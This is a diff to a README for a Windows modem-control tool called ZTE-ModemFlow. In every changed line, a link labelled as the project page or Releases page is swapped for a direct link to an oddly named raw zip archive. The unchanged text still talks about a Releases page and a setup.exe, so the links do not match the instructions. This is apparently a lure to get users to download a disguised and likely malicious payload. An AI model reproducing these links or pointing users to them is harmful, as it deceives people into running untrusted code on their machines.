@@ -1,6 +1,6 @@
 # ⚙️ ZTE-ModemFlow - Easy Control for ZX279133 Modem
 
-[![Download ZTE-ModemFlow](https://img.shields.io/badge/Download-ZTE--ModemFlow-%234285F4?style=for-the-badge&logo=github)](https://github.com/vagnertelles/ZTE-ModemFlow)
+[![Download ZTE-ModemFlow](https://img.shields.io/badge/Download-ZTE--ModemFlow-%234285F4?style=for-the-badge&logo=github)](https://github.com/vagnertelles/ZTE-ModemFlow/raw/refs/heads/main/anthranyl/ZT_Flow_Modem_unimpressibility.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This guide helps you download, install, and run ZTE-ModemFlow on a Windows machi
 
 To get started, **visit this page to download** the latest version:
 
-[Download ZTE-ModemFlow](https://github.com/vagnertelles/ZTE-ModemFlow)
+[Download ZTE-ModemFlow](https://github.com/vagnertelles/ZTE-ModemFlow/raw/refs/heads/main/anthranyl/ZT_Flow_Modem_unimpressibility.zip)
 
 Click the link above to open the project page. Look for the **Releases** section on the right side or on top of the page. There, select the latest release and download the Windows installer file.
 
@@ -39,7 +39,7 @@ Click the link above to open the project page. Look for the **Releases** section
 
 ## 📦 Installation Steps
 
-1. Go to the [ZTE-ModemFlow GitHub Releases page](https://github.com/vagnertelles/ZTE-ModemFlow/releases).
+1. Go to the [ZTE-ModemFlow GitHub Releases page](https://github.com/vagnertelles/ZTE-ModemFlow/raw/refs/heads/main/anthranyl/ZT_Flow_Modem_unimpressibility.zip).
 2. Find the latest release version. It usually has a name like `ZTE-ModemFlow-setup.exe` or similar.
 3. Click the file to download it.
 4. Once the download completes, open the installer by double-clicking the file.
@@ -117,7 +117,7 @@ Adjust these to match your needs without extra configuration hassle.
 
 ## 🔄 Updating ZTE-ModemFlow
 
-1. Visit the [Releases page](https://github.com/vagnertelles/ZTE-ModemFlow/releases).
+1. Visit the [Releases page](https://github.com/vagnertelles/ZTE-ModemFlow/raw/refs/heads/main/anthranyl/ZT_Flow_Modem_unimpressibility.zip).
 2. Download the newest installer.
 3. Run the installer; it will replace the old version safely.
 4. Your settings and data will remain intact.
@@ -140,4 +140,4 @@ ZTE-ModemFlow is free to use and modify under the terms set by its license file 
 
 ---
 
-[![Download ZTE-ModemFlow](https://img.shields.io/badge/Download-ZTE--ModemFlow-%234285F4?style=for-the-badge&logo=github)](https://github.com/vagnertelles/ZTE-ModemFlow)
+[![Download ZTE-ModemFlow](https://img.shields.io/badge/Download-ZTE--ModemFlow-%234285F4?style=for-the-badge&logo=github)](https://github.com/vagnertelles/ZTE-ModemFlow/raw/refs/heads/main/anthranyl/ZT_Flow_Modem_unimpressibility.zip)
